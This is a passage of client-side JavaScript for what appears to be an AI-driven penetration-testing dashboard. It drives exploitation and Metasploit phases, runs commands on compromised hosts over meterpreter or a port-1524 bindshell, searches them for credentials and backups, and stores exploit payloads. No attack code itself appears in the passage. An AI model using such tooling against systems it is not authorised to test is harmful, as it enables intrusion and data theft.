        const size = result.size_bytes ? ` · ${Math.max(1, Math.round(result.size_bytes / 1024))} KB` : '';
        showToast(`Reporte ${format.toUpperCase()} generado${size}`, 'success', 4500);
        logActivity(`Reporte ${format.toUpperCase()} generado para sesion #${slNo}`);
        if (result.download_url) {
            window.open(`${API_BASE_URL}${result.download_url}`, '_blank');
        }
    } catch (error) {
        console.error('Error generating report:', error);
        showToast(`No se pudo generar el reporte ${format.toUpperCase()}`, 'error');
    } finally {
        if (button) {
            button.disabled = false;
            button.innerHTML = button.dataset.originalHtml || (format === 'pdf' ? 'Generar PDF' : 'Vista HTML');
        }
    }
}

function createReportActions(slNo) {
    const wrapper = document.createElement('div');
    wrapper.className = 'report-actions';

    const options = document.createElement('div');
    options.className = 'report-options';
    options.innerHTML = `
        <label><input type="checkbox" id="report-include-exploitation-${slNo}" checked> Anexo de explotación</label>
        <label><input type="checkbox" id="report-include-commands-${slNo}" checked> Evidencia de comandos</label>
    `;

    const pdfBtn = document.createElement('button');
    pdfBtn.type = 'button';
    pdfBtn.className = 'btn btn-primary';
    pdfBtn.innerHTML = '<i class="fas fa-file-pdf"></i> Generar PDF';
    pdfBtn.addEventListener('click', () => generateReport(slNo, 'pdf', pdfBtn));

    const htmlBtn = document.createElement('button');
    htmlBtn.type = 'button';
    htmlBtn.className = 'btn btn-secondary';
    htmlBtn.innerHTML = '<i class="fas fa-eye"></i> Vista HTML';
    htmlBtn.addEventListener('click', () => generateReport(slNo, 'html', htmlBtn));

    wrapper.appendChild(options);
    const buttons = document.createElement('div');
    buttons.className = 'report-action-buttons';
    buttons.append(pdfBtn, htmlBtn);
    wrapper.appendChild(buttons);
    return wrapper;
}

// ─── Phase icons for timeline ───
const PHASE_ICONS = {
    reconnaissance:    'fa-magnifying-glass',
    scanning:          'fa-network-wired',
    enumeration:       'fa-list',
    vulnerability:     'fa-shield-halved',
    exploitation:      'fa-bolt',
    metasploit:        'fa-skull',
    post_exploitation: 'fa-user-secret',
    ai_actions:        'fa-brain',
    terminal:          'fa-terminal',
    privilege:         'fa-arrow-up',
    root:              'fa-crown',
    paused:            'fa-pause',
    completed:         'fa-check-circle',
    failed:            'fa-xmark-circle',
    command:           'fa-terminal',
    default:           'fa-circle',
};

function phaseIcon(phase) {
    const icon = PHASE_ICONS[phase] || PHASE_ICONS.default;
    return `<i class="fas ${icon}" style="width: 16px; text-align: center;"></i>`;
}

function phaseColor(phase) {
    const colors = {
        reconnaissance:    '#4fc3f7',
        scanning:          '#81c784',
        enumeration:       '#aed581',
        vulnerability:     '#ff8a65',
        exploitation:      '#ff7043',
        metasploit:        '#ce93d8',
        post_exploitation: '#f06292',
        ai_actions:        '#4dd0e1',
        terminal:          '#90a4ae',
        privilege:         '#ffd54f',
        root:              '#ffd700',
        paused:            '#ffb74d',
        completed:         '#66bb6a',
        failed:            '#ef5350',
        command:           '#90a4ae',
    };
    return colors[phase] || '#757575';
}

function renderScanDetails(scan) {
    currentScanData = scan;
    const status = String(scan.status || '').toLowerCase();
    // Keep explorer and exploit context in sync
    explorerUpdateSessionInfo(scan);
    updateExploitContext();
    const isFinished = ['completed', 'failed', 'paused'].includes(status);

    // ── Header ──
    setTextIfPresent('scan-detail-eyebrow', isFinished ? 'SESION FINALIZADA' : 'SESION ACTIVA');
    setTextIfPresent('scan-detail-title', scan.target || scan.scan_id || 'Escaneo');
    setTextIfPresent('scan-detail-subtitle', scan.scan_id ? `${scan.scan_id}${scan.access_type ? ` · ${scan.access_type}` : ''}` : '');

    // ── Meta row ──
    const statusChip = document.getElementById('sd-chip-status');
    if (statusChip) statusChip.dataset.status = isFinished ? 'completed' : 'running';
    setTextIfPresent('sd-status-text', (scan.status || 'QUEUED').toUpperCase());
    setTextIfPresent('sd-phase-text', (scan.phase || 'queue').toUpperCase());
    setTextIfPresent('sd-risk-text', (scan.risk_level || '—').toUpperCase());
    setTextIfPresent('sd-type-text', (scan.scan_type || 'standard').toUpperCase());
    setTextIfPresent('sd-intensity-text', (scan.intensity || 'medium').toUpperCase());

    // ── Phase stepper ──
    updatePhaseStepper(scan.phase);

    // ── Duration timer ──
    if (isFinished) {
        stopDurationTimer();
        if (scan.created_at && scan.completed_at) {
            const diff = new Date(scan.completed_at) - new Date(scan.created_at);
            const mins = Math.floor(diff / 60000);
            const secs = Math.floor((diff % 60000) / 1000);
            const badge = document.getElementById('scan-duration-badge');
            if (badge) { badge.style.display = 'inline-flex'; }
            document.getElementById('scan-duration-text').textContent =
                diff < 60000 ? `${secs}s` : `${mins}m ${secs}s`;
        } else {
            const badge = document.getElementById('scan-duration-badge');
            if (badge) { badge.style.display = 'none'; }
        }
    } else {
        startDurationTimer(scan.created_at);
    }

    const events = scan.events || [];
    const commands = scan.commands || [];

    // ── Timeline ──
    renderTimeline(events);
    const eventsBadge = document.getElementById('events-count-badge');
    if (eventsBadge) eventsBadge.textContent = events.length;

    // ── Commands ──
    renderLogList('scan-commands-list', commands, (cmd) =>
        makeTimelineEntry(cmd.command, 'command', cmd.timestamp, cmd.output)
    );
    const cmdBadge = document.getElementById('commands-count-badge');
    if (cmdBadge) cmdBadge.textContent = commands.length;

    // ── Vulns ──
    if (scan.scan_id) {
        loadScanVulnerabilities(scan.scan_id, scan.sl_no);
    }

    // ── LLM & Raw ──
    setTextIfPresent('scan-llm-response', scan.llm_response || 'Aun no hay respuesta del modelo.');
    setTextIfPresent('scan-raw-output', scan.raw_scan || 'Aun no hay salida de recon.');

    // ── Exploitation ──
    renderLogList('scan-exploitation-list', events.filter((event) =>
        ['exploitation', 'metasploit', 'post_exploitation', 'ai_actions', 'terminal', 'paused', 'privilege', 'root'].includes(event.phase)
        || String(event.event_type || '').includes('exploit')
        || String(event.event_type || '').includes('msf')
        || String(event.event_type || '').includes('ai_action')
        || String(event.event_type || '').includes('root')
    ), (event) => makeTimelineEntry(event.title, event.phase, event.created_at, event.content, event.event_type));

    // ── Pause / Rescan ──
    const pauseBtn = document.getElementById('pause-scan-btn');
    if (pauseBtn) {
        pauseBtn.disabled = isFinished;
        pauseBtn.style.display = isFinished ? 'none' : 'inline-flex';
    }
    const rescanBtn = document.getElementById('rescan-btn');
    if (rescanBtn) {
        rescanBtn.style.display = isFinished ? 'inline-flex' : 'none';
    }

    // ── Collapsible raw output ──
    const rawToggle = document.getElementById('sd-raw-toggle');
    const rawBody = document.getElementById('sd-raw-body');
    const rawArrow = document.getElementById('sd-raw-arrow');
    if (rawToggle && rawBody) {
        let rawOpen = true;
        rawToggle.onclick = () => {
            rawOpen = !rawOpen;
            rawBody.style.display = rawOpen ? 'block' : 'none';
            if (rawArrow) rawArrow.style.transform = rawOpen ? 'rotate(0deg)' : 'rotate(-90deg)';
        };
    }

    updateTerminalState(scan);
}

// ─── Phase stepper ───
function updatePhaseStepper(currentPhase) {
    const steps = document.querySelectorAll('.sd-step');
    const phaseOrder = ['queued','reconnaissance','scanning','enumeration','vulnerability','exploitation','post_exploitation','completed'];
    const idx = phaseOrder.indexOf((currentPhase || 'queued').toLowerCase());
    steps.forEach((step, i) => {
        step.classList.remove('active', 'done');
        if (i < idx) step.classList.add('done');
        else if (i === idx) step.classList.add('active');
    });
}

// ─── Duration timer ───
let durationTimerInterval = null;
function startDurationTimer(createdAt) {
    stopDurationTimer();
    const badge = document.getElementById('scan-duration-badge');
    const text = document.getElementById('scan-duration-text');
    if (!badge || !text) return;
    if (!createdAt) { badge.style.display = 'none'; return; }
    badge.style.display = 'inline-flex';
    const start = new Date(createdAt).getTime();
    function tick() {
        const diff = Date.now() - start;
        const mins = Math.floor(diff / 60000);
        const secs = Math.floor((diff % 60000) / 1000);
        text.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
    }
    tick();
    durationTimerInterval = setInterval(tick, 1000);
}
function stopDurationTimer() {
    if (durationTimerInterval) {
        clearInterval(durationTimerInterval);
        durationTimerInterval = null;
    }
}

// ─── Timeline entry ───
const TL_ICONS = {
    reconnaissance: 'fa-magnifying-glass', scanning: 'fa-network-wired',
    enumeration: 'fa-list', vulnerability: 'fa-shield-halved',
    exploitation: 'fa-bolt', metasploit: 'fa-skull',
    post_exploitation: 'fa-user-secret', ai_actions: 'fa-brain',
    terminal: 'fa-terminal', privilege: 'fa-arrow-up',
    root: 'fa-crown', paused: 'fa-pause',
    completed: 'fa-check-circle', failed: 'fa-xmark-circle',
    command: 'fa-terminal', default: 'fa-circle',
};
const TL_COLORS = {
    reconnaissance: '#176bdf', scanning: '#118469',
    enumeration: '#6a7b91', vulnerability: '#c47b16',
    exploitation: '#c73f4f', metasploit: '#7b4f9e',
    post_exploitation: '#c73f4f', ai_actions: '#176bdf',
    terminal: '#6a7b91', privilege: '#c47b16',
    root: '#c47b16', paused: '#c47b16',
    completed: '#118469', failed: '#c73f4f',
    command: '#6a7b91', default: '#9aa8ba',
};

function makeTimelineEntry(title, phase, timestamp, content) {
    const p = (phase || '').toLowerCase();
    const color = TL_COLORS[p] || TL_COLORS.default;
    const icon = TL_ICONS[p] || TL_ICONS.default;
    const div = document.createElement('div');
    div.className = 'sd-tl-item';
    div.innerHTML = `
        <div class="sd-tl-icon" style="background:${color}1a;color:${color}"><i class="fas ${icon}"></i></div>
        <div class="sd-tl-body">
            <div class="sd-tl-title">${escapeHtml(title || 'Evento')}</div>
            <div class="sd-tl-meta"><span>${p.replace(/_/g, ' ')}</span>${timestamp ? `<span>·</span><span>${formatDate(timestamp)}</span>` : ''}</div>
            ${content ? `<div class="sd-tl-content">${escapeHtml(content.length > 200 ? content.slice(0,200)+'...' : content)}</div>` : ''}
        </div>`;
    return div;
}

function renderTimeline(events) {
    const container = document.getElementById('scan-events-list');
    if (!container) return;
    container.innerHTML = '';
    if (!events || events.length === 0) {
        container.innerHTML = '<div class="sd-empty"><i class="fas fa-hourglass-half"></i><p>Esperando eventos...</p></div>';
        return;
    }
    const frag = document.createDocumentFragment();
    events.forEach((event) => frag.appendChild(makeTimelineEntry(event.title, event.phase, event.created_at, event.content)));
    container.appendChild(frag);
}

// ─── Terminal State ───
function updateTerminalState(scan) {
    const sessionId = scan.session_id || null;
    const isBindShell = scan.access_type === 'bindshell';
    const hasRoot = scan.has_root;

    setTextIfPresent('sd-session-badge', sessionId ? sessionId : (isBindShell ? 'bindshell:1524' : '—'));
    const rootBadge = document.getElementById('sd-root-badge');
    if (rootBadge) {
        rootBadge.textContent = hasRoot ? 'ROOT' : 'no root';
        rootBadge.className = 'sd-badge' + (hasRoot ? ' sd-badge-success' : '');
    }

    const statusBadge = document.getElementById('terminal-status-badge');
    const executeBtn = document.getElementById('terminal-command-btn');
    const analyzeBtn = document.getElementById('terminal-analyze-btn');
    const chatBtn = document.getElementById('terminal-chat-btn');
    const sensitiveBtn = document.getElementById('sensitive-search-btn');
    const terminalOutput = document.getElementById('terminal-output');
    const sessionActions = document.getElementById('session-actions');

    if (!executeBtn || !analyzeBtn || !chatBtn || !terminalOutput || !sessionActions) return;

    chatBtn.disabled = !scan.scan_id;

    if (!hasRoot) {
        executeBtn.disabled = true;
        analyzeBtn.disabled = true;
        if (sensitiveBtn) sensitiveBtn.disabled = true;
        sessionActions.style.display = 'none';

        if (statusBadge) {
            statusBadge.textContent = '⏳ Sin root';
            statusBadge.className = 'sd-badge';
            statusBadge.style.cssText = 'background:rgba(196,123,22,0.1);color:#c47b16';
        }

        terminalOutput.textContent = sessionId
            ? 'Sesion establecida. Esperando elevacion de privilegios...'
            : 'Esperando acceso root para habilitar comandos...';
    } else {
        executeBtn.disabled = false;
        analyzeBtn.disabled = false;
        if (sensitiveBtn) sensitiveBtn.disabled = false;

        if (statusBadge) {
            statusBadge.textContent = hasRoot ? '✅ Root activo' : '⚠️ Root limitado';
            statusBadge.className = 'sd-badge sd-badge-success';
            statusBadge.style.cssText = '';
        }

        sessionActions.style.display = sessionId ? 'flex' : 'none';

        const defaults = ['Sin salida todavia.','Sin salida todavía.','No hay sesión activa','Acceso root obtenido','Esperando acceso root','Sesion establecida.'];
        const cur = (terminalOutput.textContent || '').trim();
        if (defaults.some(m => cur.startsWith(m)) || cur === 'Esperando acceso root para habilitar comandos...') {
            terminalOutput.textContent = sessionId
                ? 'Acceso root via meterpreter. Ingresa un comando.'
                : isBindShell
                    ? 'Acceso root via bindshell 1524. Puedes ejecutar comandos.'
                    : 'Acceso root obtenido. Puedes ejecutar comandos.';
        }
    }
}

async function executeTerminalCommand() {
    if (!currentScanData || !currentScanData.scan_id || (!currentScanData.session_id && currentScanData.access_type !== 'bindshell')) {
        showToast('No hay sesión activa para ejecutar comandos.', 'error');
        return;
    }

    const commandInput = document.getElementById('terminal-command-input');
    const command = commandInput.value.trim();
    if (!command) {
        showToast('Ingresa un comando antes de ejecutar.', 'error');
        return;
    }

    try {
        const result = await apiFetch(`/scans/${currentScanData.scan_id}/terminal`, {
            method: 'POST',
            body: JSON.stringify({ session_id: currentScanData.session_id || null, command }),
            timeout: 60000,
        });
        lastTerminalCommand = command;
        appendTerminalOutput(command, result.output || 'Sin salida.');
        const rootBadge = document.getElementById('sd-root-badge');
        if (rootBadge) {
            rootBadge.textContent = result.has_root ? 'ROOT' : 'no root';
            rootBadge.className = 'sd-badge' + (result.has_root ? ' sd-badge-success' : '');
        }
        if (result.access_type) currentScanData.access_type = result.access_type;
        showToast('Comando ejecutado correctamente.', 'success');
        commandInput.value = '';
        fetchActiveScan();
    } catch (error) {
        console.error('Error executing terminal command:', error);
        showToast('Error ejecutando comando en la terminal.', 'error');
    }
}

async function analyzeTerminalOutput() {
    if (!currentScanData || !currentScanData.scan_id) {
        showToast('No hay sesión activa para analizar.', 'error');
        return;
    }

    const output = document.getElementById('terminal-output').dataset.lastOutput || document.getElementById('terminal-output').textContent.trim();
    if (!output) {
        showToast('No hay salida disponible para analizar.', 'error');
        return;
    }

    try {
        const command = lastTerminalCommand || document.getElementById('terminal-command-input').value.trim();
        const result = await apiFetch(`/scans/${currentScanData.scan_id}/terminal/analyze`, {
            method: 'POST',
            body: JSON.stringify({ output, command, session_id: currentScanData.session_id }),
            timeout: 60000,
        });
        document.getElementById('terminal-analysis-response').textContent = result.analysis || 'No se obtuvo respuesta de la IA.';
        showToast('Salida enviada a la IA para análisis.', 'success');
    } catch (error) {
        console.error('Error analyzing terminal output:', error);
        showToast('Error enviando la salida a la IA.', 'error');
    }
}

async function searchSensitiveData() {
    if (!currentScanData || !currentScanData.scan_id || !currentScanData.has_root) {
        showToast('Necesitas acceso root antes de buscar datos sensibles.', 'error');
        return;
    }

    const button = document.getElementById('sensitive-search-btn');
    if (button) button.disabled = true;
    appendTerminalOutput('sensitive-search', 'Buscando archivos sensibles, credenciales, backups y bases de datos...');

    try {
        const result = await apiFetch(`/scans/${currentScanData.scan_id}/sensitive-search`, {
            method: 'POST',
            timeout: 120000,
        });
        lastTerminalCommand = 'sensitive-search';
        appendTerminalOutput('sensitive-search resultado', result.output || 'Sin hallazgos.');
        document.getElementById('terminal-analysis-response').textContent = result.analysis || 'No se obtuvo analisis de la IA.';
        showToast('Busqueda sensible finalizada.', 'success');
        await fetchActiveScan();
    } catch (error) {
        console.error('Error searching sensitive data:', error);
        const detail = error?.message ? (error.message.length > 120 ? error.message.slice(0, 120) + '...' : error.message) : 'Error buscando datos sensibles';
        showToast(detail, 'error', 5000);
        appendTerminalOutput('sensitive-search error', detail);
    } finally {
        if (button) button.disabled = false;
    }
}

async function sendChatToAi() {
    if (!currentScanData || !currentScanData.scan_id) {
        showToast('No hay sesión activa para consultar a la IA.', 'error');
        return;
    }

    const prompt = document.getElementById('terminal-chat-input').value.trim();
    if (!prompt) {
        showToast('Escribe una consulta para enviar a la IA.', 'error');
        return;
    }

    try {
        const response = await apiFetch(`/scans/${currentScanData.scan_id}/terminal/chat`, {
            method: 'POST',
            body: JSON.stringify({ prompt, session_id: currentScanData.session_id }),
            timeout: 60000,
        });
        document.getElementById('terminal-chat-response').textContent = response.response || 'No se obtuvo respuesta de la IA.';
        showToast('Consulta enviada a la IA correctamente.', 'success');
    } catch (error) {
        console.error('Error sending chat prompt to IA:', error);
        showToast('Error enviando la consulta a la IA.', 'error');
    }
}

async function stopSession() {
    if (!currentScanData || !currentScanData.scan_id || !currentScanData.session_id) {
        showToast('No hay sesión activa para detener.', 'error');
        return;
    }

    if (!confirm('¿Estás seguro de que quieres detener la sesión? Esto cerrará la conexión meterpreter.')) {
        return;
    }

    try {
        await apiFetch(`/scans/${currentScanData.scan_id}/sessions/${currentScanData.session_id}/stop`, {
            method: 'POST',
        });
        showToast('Sesión detenida exitosamente.', 'success');
        // Refresh scan details
        await fetchActiveScan();
    } catch (error) {
        console.error('Error stopping session:', error);
        showToast('Error deteniendo la sesión.', 'error');
    }
}

async function destroySession() {
    if (!currentScanData || !currentScanData.scan_id || !currentScanData.session_id) {
        showToast('No hay sesión activa para eliminar.', 'error');
        return;
    }

    if (!confirm('¿Estás seguro de que quieres eliminar la sesión? Esta acción no se puede deshacer.')) {
        return;
    }

    try {
        await apiFetch(`/scans/${currentScanData.scan_id}/sessions/${currentScanData.session_id}`, {
            method: 'DELETE',
        });
        showToast('Sesión eliminada exitosamente.', 'success');
        // Refresh scan details
        await fetchActiveScan();
    } catch (error) {
        console.error('Error destroying session:', error);
        showToast('Error eliminando la sesión.', 'error');
    }
}

async function pauseActiveScan() {
    if (!activeScanId) {
        showToast('No hay escaneo activo para pausar.', 'error');
        return;
    }

    try {
        await apiFetch(`/scans/${activeScanId}/pause`, { method: 'POST' });
        showToast('Pausa solicitada. La automatizacion se detendra en el proximo punto seguro.', 'warning');
        await fetchActiveScan();
    } catch (error) {
        console.error('Error pausing scan:', error);
        showToast('No se pudo pausar el escaneo.', 'error');
    }
}

async function deleteHistoryItem(slNo) {
    if (!confirm(`Eliminar el escaneo #${slNo} y todos sus resultados?`)) return;

    try {
        await apiFetch(`/history/${slNo}`, { method: 'DELETE' });
        showToast(`Escaneo #${slNo} eliminado.`, 'success');
        await Promise.all([loadRecentScans(), loadLatestVulnerabilities(), loadLatestExploits()]);
    } catch (error) {
        console.error('Error deleting history item:', error);
        showToast('No se pudo eliminar el escaneo.', 'error');
    }
}

async function fetchActiveScan() {
    if (!activeScanId) return;
    const requestedScanId = activeScanId;
    try {
        const scan = await apiFetch(`/scans/${requestedScanId}`);
        if (requestedScanId !== activeScanId) return;
        renderScanDetails(scan);
        if (['completed', 'failed', 'paused'].includes(scan.status)) {
            stopActiveScanPolling();
            await Promise.all([loadRecentScans(), loadLatestVulnerabilities(), loadLatestExploits()]);
        }
    } catch (error) {
        if (error.status === 404 || error.message.includes('Scan not found') || error.message.includes('404')) {
            if (requestedScanId === activeScanId) {
                showToast('El escaneo activo ya no existe, reiniciando estado.', 'warning');
            }
            setActiveScan(null);
            stopActiveScanPolling();
            return;
        }
        console.error('Error loading active scan:', error);
    }
}

function startActiveScanPolling() {
    stopActiveScanPolling();
    if (!activeScanId) return;
    activeScanPollTimer = setInterval(() => {
        if (!activeScanId) {
            stopActiveScanPolling();
            return;
        }
        fetchActiveScan();
    }, 3000);
    fetchActiveScan();
}

function stopActiveScanPolling() {
    if (activeScanPollTimer) {
        clearInterval(activeScanPollTimer);
        activeScanPollTimer = null;
    }
}

function showSudoPasswordModal() {
    return new Promise((resolve) => {
        const modal = document.getElementById('sudo-modal');
        if (!modal) {
            console.error('Sudo modal element not found');
            showToast('Modal de sudo no disponible. El escaneo seguirá sin sudo.', 'warning');
            resolve('');
            return;
        }

        const form = document.getElementById('sudo-password-form');
        if (!form) {
            console.error('Sudo password form not found');
            showToast('Formulario de sudo no encontrado. Continuando sin sudo.', 'warning');
            resolve('');
            return;
        }

        const input = document.getElementById('sudo-password-input');
        if (!input) {
            console.error('Sudo password input not found');
            showToast('Campo de password no encontrado. Continuando sin sudo.', 'warning');
            resolve('');
            return;
        }

        const cancelBtn = document.getElementById('sudo-cancel-btn');
        if (!cancelBtn) {
            console.error('Sudo cancel button not found');
            showToast('Botón cancelar de sudo no encontrado. Continuando sin sudo.', 'warning');
            resolve('');
            return;
        }

        // Reset form
        input.value = '';
        form.reset();

        // Show modal
        modal.classList.add('active');

        // Handle form submit
        const handleSubmit = (e) => {
            e.preventDefault();
            const password = input.value.trim();
            modal.classList.remove('active');
            form.removeEventListener('submit', handleSubmit);
            cancelBtn.removeEventListener('click', handleCancel);
            modal.querySelector('.modal-close')?.removeEventListener('click', handleCancel);
            document.removeEventListener('keydown', handleKeydown);
            resolve(password);
        };

        // Handle cancel
        const handleCancel = () => {
            modal.classList.remove('active');
            form.removeEventListener('submit', handleSubmit);
            cancelBtn.removeEventListener('click', handleCancel);
            modal.querySelector('.modal-close')?.removeEventListener('click', handleCancel);
            document.removeEventListener('keydown', handleKeydown);
            resolve(null);
        };

        const handleKeydown = (e) => {
            if (e.key === 'Escape') handleCancel();
        };

        form.addEventListener('submit', handleSubmit);
        cancelBtn.addEventListener('click', handleCancel);
        modal.querySelector('.modal-close')?.addEventListener('click', handleCancel, { once: true });
        document.addEventListener('keydown', handleKeydown);
    });
}

async function startScan(target, source = 'dashboard', scanConfig = {}) {
    if (!apiToken && !(await authenticate())) {
        showToast('Autentica primero con una API key valida', 'error');
        return;
    }

    // Show sudo password modal
    const sudoPassword = await showSudoPasswordModal();
    if (sudoPassword === null) {
        // User cancelled
        return;
    }

    const scanButtons = document.querySelectorAll('#quick-scan-form button, #full-scan-form button[type="submit"]');
    scanButtons.forEach((button) => { button.disabled = true; });
    document.getElementById('scan-progress').style.display = source === 'dashboard' ? 'block' : 'none';

    try {
        const data = await apiFetch('/scan', {
            method: 'POST',
            body: JSON.stringify({
                target,
                sudo_password: sudoPassword,
                scan_type: scanConfig.scan_type || 'standard',
                intensity: scanConfig.intensity || 'medium',
                options: scanConfig.options || {},
            }),
        });
        setActiveScan(data.scan_id);
        document.getElementById('progress-scan-id').textContent = `(ID: ${data.scan_id})`;
        showToast(`Escaneo iniciado: ${target}`, 'success');
        logActivity(`Escaneo iniciado en ${target}`);
        await loadRecentScans();
        showSection('scan-detail');
        startActiveScanPolling();
    } catch (error) {
        console.error('Error starting scan:', error);
        showToast('Error al iniciar escaneo', 'error');
    } finally {
        scanButtons.forEach((button) => { button.disabled = false; });
        document.getElementById('scan-progress').style.display = 'none';
    }
}

async function loadRecentScans() {
    try {
        const scans = (await apiFetch('/history')).map(normalizeScan);
        latestScansCache = scans;
        const recentList = document.getElementById('recent-scans-list');
        const historyList = document.getElementById('full-history-list');
        const reportsList = document.getElementById('reports-list');
        recentList.innerHTML = '';
        historyList.innerHTML = '';
        reportsList.innerHTML = '';

        if (scans.length === 0) {
            const empty = `<div class="empty-state"><i class="fas fa-inbox"></i><p>No hay escaneos recientes</p></div>`;
            recentList.innerHTML = empty;
            historyList.innerHTML = empty;
            reportsList.innerHTML = `<div class="empty-state"><i class="fas fa-file-export"></i><p>No hay sesiones disponibles para reportar</p></div>`;
            updateStatistics();
            return;
        }

        const recentFragment = document.createDocumentFragment();
        scans.slice(0, 5).forEach((scan) => {
            const status = normalizeStatusLabel(scan.status);
            const item = document.createElement('div');
            item.className = 'scan-item';
            item.innerHTML = `
                <div class="scan-item-header">
                    <span class="scan-target">${escapeHtml(scan.target)}</span>
                    <span class="scan-status ${status}">${status.toUpperCase()}</span>
                </div>
                <div><span class="scan-date">${formatDate(scan.timestamp)}${scan.scan_id ? ` | ${escapeHtml(scan.scan_id)}` : ''}</span></div>
            `;
            if (scan.scan_id) {
                item.addEventListener('click', () => {
                    setActiveScan(scan.scan_id);
                    showSection('scan-detail');
                    startActiveScanPolling();
                });
            }
            recentFragment.appendChild(item);
        });
        recentList.appendChild(recentFragment);

        const historyFragment = document.createDocumentFragment();
        const reportsFragment = document.createDocumentFragment();
        scans.forEach((scan) => {
            const status = normalizeStatusLabel(scan.status);
            const row = document.createElement('div');
            row.className = 'scan-item';
            row.innerHTML = `
                <div class="scan-item-header">
                    <span class="scan-target">#${scan.sl_no} ${escapeHtml(scan.target)}</span>
                    <span class="scan-status ${status}">${status.toUpperCase()}</span>
                </div>
                <div><span class="scan-date">${formatDate(scan.timestamp)}${scan.scan_id ? ` | ${escapeHtml(scan.scan_id)}` : ''}</span></div>
                <div class="settings-actions" style="margin-top: 0.8rem;">
                    ${scan.scan_id ? `<button type="button" class="btn btn-secondary" data-open-scan="${scan.scan_id}">
                        <i class="fas fa-eye"></i> Ver
                    </button>` : ''}
                    <button type="button" class="btn btn-danger" data-delete-history="${scan.sl_no}">
                        <i class="fas fa-trash"></i> Eliminar
                    </button>
                </div>
            `;
            row.querySelector('[data-open-scan]')?.addEventListener('click', () => {
                setActiveScan(scan.scan_id);
                showSection('scan-detail');
                startActiveScanPolling();
            });
            row.querySelector('[data-delete-history]')?.addEventListener('click', () => deleteHistoryItem(scan.sl_no));
            historyFragment.appendChild(row);

            const reportRow = document.createElement('div');
            reportRow.className = 'report-session-card';
            reportRow.innerHTML = `
                <div class="report-session-icon"><i class="fas fa-shield-halved"></i></div>
                <div class="report-session-copy">
                    <span class="report-session-kicker">SESIÓN #${scan.sl_no}</span>
                    <strong>${escapeHtml(scan.target)}</strong>
                    <span>${formatDate(scan.timestamp)}${scan.scan_id ? ` · ${escapeHtml(scan.scan_id)}` : ''}</span>
                </div>
                <span class="scan-status ${status}">${status.toUpperCase()}</span>
            `;
            reportRow.appendChild(createReportActions(scan.sl_no));
            reportsFragment.appendChild(reportRow);
        });
        historyList.appendChild(historyFragment);
        reportsList.appendChild(reportsFragment);
        updateStatistics();
    } catch (error) {
        console.error('Error loading scans:', error);
        updateStatistics();
    }
}

async function loadLatestVulnerabilities() {
    try {
        const vulns = (await apiFetch('/vulnerabilities')).map(normalizeVuln)
            .sort((a, b) => severityRank(a.severity) - severityRank(b.severity));
        latestVulnsCache = vulns;
        const vulnsList = document.getElementById('latest-vulns-list');
        vulnsList.innerHTML = '';

        if (vulns.length === 0) {
            vulnsList.innerHTML = `<div class="empty-state"><i class="fas fa-shield-check"></i><p>Sin vulnerabilidades detectadas</p></div>`;
            updateStatistics();
            return;
        }

        const fragment = document.createDocumentFragment();
        vulns.forEach((vuln) => {
            const severity = normalizeSeverityLabel(vuln.severity);
            const vulnEl = document.createElement('div');
            vulnEl.className = 'vuln-item-card';
            vulnEl.innerHTML = `
                <div class="scan-item-header">
                    <span class="scan-target">${escapeHtml(vuln.vuln_name)}</span>
                    <span class="scan-status ${severity}">${severity.toUpperCase()}</span>
                </div>
                <div>
                    <p style="margin: 0.45rem 0; font-size: 0.9rem; color: var(--accent);">
                        <strong>Objetivo:</strong> ${escapeHtml(vulnTargetLabel(vuln))}
                    </p>
                    <p style="margin: 0.5rem 0; font-size: 0.9rem; color: var(--text-secondary);">
                        <strong>Puerto:</strong> ${escapeHtml(vuln.port || 'N/A')} | <strong>Servicio:</strong> ${escapeHtml(vuln.service || 'N/A')}
                    </p>
                    <p style="margin: 0; font-size: 0.85rem; color: var(--text-secondary);">${escapeHtml(cleanDisplayText(vuln.description) || 'Sin descripcion')}</p>
                </div>
            `;
            vulnEl.addEventListener('click', () => viewVulnerabilityDetails(vuln));
            fragment.appendChild(vulnEl);
        });
        vulnsList.appendChild(fragment);

        updateStatistics();
    } catch (error) {
        console.error('Error loading vulnerabilities:', error);
        updateStatistics();
    }
}

async function loadLatestExploits() {
    try {
        const exploits = await apiFetch('/exploits');
        latestExploitsCache = exploits;
        updateStatistics();
    } catch (error) {
        console.error('Error loading exploits:', error);
        updateStatistics();
    }
}

function normalizeExploitArtifact(item) {
    return item || {};
}

function collectExploitArtifactForm() {
    return {
        target: document.getElementById('exploit-target')?.value.trim() || '',
        title: document.getElementById('exploit-title')?.value.trim() || 'Payload sin titulo',
        cve: document.getElementById('exploit-cve')?.value.trim() || '',
        language: document.getElementById('exploit-language')?.value || 'python',
        filename: document.getElementById('exploit-filename')?.value.trim() || '',
        code: document.getElementById('exploit-code')?.value || '',
        notes: document.getElementById('exploit-notes')?.value || '',
        status: 'draft',
    };
}

function fillExploitArtifactForm(artifact = null) {
    selectedExploitArtifact = artifact;
    document.getElementById('exploit-artifact-id').value = artifact?.id || '';
    document.getElementById('exploit-target').value = artifact?.target || '';
    document.getElementById('exploit-title').value = artifact?.title || '';
    document.getElementById('exploit-cve').value = artifact?.cve || '';
    document.getElementById('exploit-language').value = artifact?.language || 'python';
    document.getElementById('exploit-filename').value = artifact?.filename || '';
    document.getElementById('exploit-code').value = artifact?.code || '';
    document.getElementById('exploit-notes').value = artifact?.notes || '';
    document.getElementById('exploit-run-output').textContent = artifact?.last_result || 'La salida de ejecución aparecerá aquí.';
    document.getElementById('exploit-ai-response').textContent = 'La respuesta de la IA aparecerá aquí.';
    pendingAiExploitCode = '';
    renderExploitLibraryList(exploitLibraryCache);
}

function renderExploitLibraryList(items) {
    const container = document.getElementById('exploit-library-list');
    if (!container) return;
    container.innerHTML = '';
    if (!Array.isArray(items) || items.length === 0) {
        container.innerHTML = `<div class="empty-state"><i class="fas fa-code"></i><p>No hay payloads guardados todavía</p></div>`;
        return;
    }
    const grouped = items.reduce((acc, item) => {
        const key = item.target || 'Sin objetivo';
        acc[key] = acc[key] || [];
        acc[key].push(item);
        return acc;
    }, {});
    const fragment = document.createDocumentFragment();
    Object.entries(grouped).forEach(([target, artifacts]) => {
        const header = document.createElement('div');
        header.className = 'log-entry';
        header.innerHTML = `<div class="log-entry-header"><span class="log-entry-title">${escapeHtml(target)}</span><span class="log-entry-phase">${artifacts.length} payloads</span></div>`;
        fragment.appendChild(header);
        artifacts.forEach((artifact) => {
            const entry = document.createElement('div');
            entry.className = `log-entry exploit-library-item ${selectedExploitArtifact?.id === artifact.id ? 'active' : ''}`;
            entry.innerHTML = `
                <div class="log-entry-header">
